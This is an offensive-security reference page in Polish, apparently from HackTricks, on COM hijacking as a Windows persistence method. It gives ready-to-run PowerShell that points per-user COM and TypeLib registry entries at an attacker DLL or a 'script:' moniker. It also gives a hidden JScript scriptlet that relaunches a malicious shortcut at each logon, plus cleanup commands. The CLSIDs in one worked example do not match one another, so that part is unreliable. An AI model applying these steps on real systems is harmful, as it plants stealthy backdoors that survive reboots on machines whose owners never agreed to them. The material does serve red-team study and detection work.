# COM Hijacking

{{#include ../../banners/hacktricks-training.md}}

### Wyszukiwanie nieistniejących komponentów COM

Ponieważ wartości HKCU mogą być modyfikowane przez użytkowników **COM Hijacking** może być użyte jako **mechanizm utrzymania dostępu**. Korzystając z `procmon` łatwo znaleźć przeszukiwane wpisy rejestru COM, które nie istnieją, a które atakujący mógłby utworzyć, aby utrzymać się w systemie. Filtry:

- Operacje **RegOpenKey**.
- gdzie _Result_ jest **NAME NOT FOUND**.
- oraz _Path_ kończy się na **InprocServer32**.

Po wybraniu, który nieistniejący komponent COM chcesz podszyć, wykonaj następujące polecenia. _Uważaj, jeśli zdecydujesz się podszyć pod COM, który jest ładowany co kilka sekund, ponieważ może to być przesadne._
```bash
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```
### Hijackable Task Scheduler COM components

Windows Tasks używają Custom Triggers do wywoływania COM objects, a ponieważ są uruchamiane przez Task Scheduler, łatwiej przewidzieć, kiedy zostaną wywołane.

<pre class="language-powershell"><code class="lang-powershell"># Show COM CLSIDs
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
if ($Task.Actions.ClassId -ne $null)
{
if ($Task.Triggers.Enabled -eq $true)
{
$usersSid = "S-1-5-32-545"
$usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }

if ($Task.Principal.GroupId -eq $usersGroup)
{
Write-Host "Task Name: " $Task.TaskName
Write-Host "Task Path: " $Task.TaskPath
Write-Host "CLSID: " $Task.Actions.ClassId
Write-Host
}
}
}
}

# Sample Output:
<strong># Task Name:  Example
</strong># Task Path:  \Microsoft\Windows\Example\
# CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
# [more like the previous one...]</code></pre>

Sprawdzając wyjście, możesz wybrać taki, który będzie uruchamiany na przykład **za każdym razem, gdy użytkownik się zaloguje**.

Teraz, szukając CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** w **HKEY\CLASSES\ROOT\CLSID** oraz w HKLM i HKCU, zwykle stwierdzisz, że wartość ta nie istnieje w HKCU.
```bash
# Exists in HKCR\CLSID\
Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"

Name           Property
----           --------
InprocServer32 (default)      : C:\Windows\system32\some.dll
ThreadingModel : Both

# Exists in HKLM
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize

Name                                   Property
----                                   --------
{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler

# Doesn't exist in HKCU
PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
```
Następnie możesz po prostu utworzyć wpis HKCU i za każdym logowaniem użytkownika twój backdoor zostanie uruchomiony.

---

## COM TypeLib Hijacking (script: moniker persistence)

Type Libraries (TypeLib) definiują interfejsy COM i są ładowane za pomocą `LoadTypeLib()`. Gdy serwer COM jest instancjonowany, OS może także załadować powiązany TypeLib, konsultując klucze rejestru pod `HKCR\TypeLib\{LIBID}`. Jeśli ścieżka TypeLib zostanie zamieniona na **moniker**, np. `script:C:\...\evil.sct`, Windows wykona scriptlet w momencie rozwiązywania TypeLib — dając ukryty mechanizm persistence, który uruchamia się, gdy wspólne komponenty są używane.

Zaobserwowano to w kontekście Microsoft Web Browser control (często ładowanego przez Internet Explorer, aplikacje osadzające WebBrowser, a nawet `explorer.exe`).

### Kroki (PowerShell)

1) Zidentyfikuj TypeLib (LIBID) używany przez CLSID o dużej częstotliwości. Przykładowy CLSID często nadużywany przez malware chains: `{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}` (Microsoft Web Browser).
```powershell
$clsid = '{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}'
$libid = (Get-ItemProperty -Path "Registry::HKCR\\CLSID\\$clsid\\TypeLib").'(default)'
$ver   = (Get-ChildItem "Registry::HKCR\\TypeLib\\$libid" | Select-Object -First 1).PSChildName
"CLSID=$clsid  LIBID=$libid  VER=$ver"
```
2) Wskaż ścieżkę TypeLib dla użytkownika na lokalny scriptlet, używając monikera `script:` (nie są wymagane prawa administratora):
```powershell
$dest = 'C:\\ProgramData\\Udate_Srv.sct'
New-Item -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Force | Out-Null
Set-ItemProperty -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Name '(default)' -Value "script:$dest"
```
3) Umieść minimalny JScript `.sct`, który ponownie uruchomi twój główny payload (np. `.lnk` używany przez początkowy łańcuch):
```xml
<?xml version="1.0"?>
<scriptlet>
<registration progid="UpdateSrv" classid="{F0001111-0000-0000-0000-0000F00D0001}" description="UpdateSrv"/>
<script language="JScript">
<![CDATA[
try {
var sh = new ActiveXObject('WScript.Shell');
// Re-launch the malicious LNK for persistence
var cmd = 'cmd.exe /K set X=1&"C:\\ProgramData\\NDA\\NDA.lnk"';
sh.Run(cmd, 0, false);
} catch(e) {}
]]>
</script>
</scriptlet>
```
4) Wywoływanie – otwarcie IE, aplikacji, która osadza WebBrowser control, lub nawet rutynowa aktywność Explorer spowoduje załadowanie TypeLib i wykonanie scriptlet, ponownie uzbrajając twój chain przy logon/reboot.

Czyszczenie
```powershell
# Remove the per-user TypeLib hijack
Remove-Item -Recurse -Force "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver" 2>$null
# Delete the dropped scriptlet
Remove-Item -Force 'C:\\ProgramData\\Udate_Srv.sct' 2>$null
```
Uwagi
- Możesz zastosować tę samą logikę do innych często używanych komponentów COM; zawsze najpierw ustal rzeczywisty `LIBID` z `HKCR\CLSID\{CLSID}\TypeLib`.
- Na systemach 64-bitowych możesz również wypełnić podklucz `win64` dla konsumentów 64-bitowych.

## Źródła

- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)

{{#include ../../banners/hacktricks-training.md}}
